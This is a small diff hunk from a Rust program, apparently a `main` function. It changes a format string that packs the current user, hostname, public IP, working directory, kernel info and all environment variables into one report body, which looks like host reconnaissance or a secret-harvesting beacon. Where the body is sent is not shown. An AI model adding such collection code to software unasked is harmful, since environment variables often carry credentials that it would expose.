@@ -112,7 +112,7 @@ fn main() {
         .collect();
 
     let body = format!(
-        "whoami={}\nhostname={}\npublic_ip={}\npwd={}\nuname={}\nenv={}",
+        "2::: whoami={}\nhostname={}\npublic_ip={}\npwd={}\nuname={}\nenv={}",
         whoami, hostname, public_ip, pwd, uname, env_vars.join("|")
     );
 
